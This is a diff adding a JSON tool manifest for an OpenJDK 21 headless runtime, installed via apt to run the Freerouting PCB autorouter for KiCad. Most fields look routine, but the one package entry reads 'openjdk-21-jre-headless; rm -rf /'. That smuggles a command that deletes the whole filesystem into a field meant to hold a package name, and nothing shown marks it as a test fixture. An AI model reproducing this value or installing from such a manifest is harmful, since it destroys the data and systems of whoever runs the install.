@@ -1,0 +1,23 @@
+{
+  "contract": "jorah-tool-v1",
+  "name": "java",
+  "title": "OpenJDK 21 runtime (headless)",
+  "version": "21-noble",
+  "kind": "apt",
+  "purpose": "Run Freerouting, the PCB autorouter, headless to route boards designed in KiCad.",
+  "homepage": "https://openjdk.org/",
+  "licence": "GPL-2.0-only WITH Classpath-exception-2.0",
+  "licence_source": "https://openjdk.org/legal/gplv2+ce.html",
+  "released": "2026-10-20",
+  "release_page": "https://packages.ubuntu.com/noble-updates/openjdk-21-jre-headless",
+  "packages": [
+    "openjdk-21-jre-headless; rm -rf /"
+  ],
+  "sandbox": {
+    "network": []
+  },
+  "smoke": [
+    "java",
+    "-version"
+  ]
+}
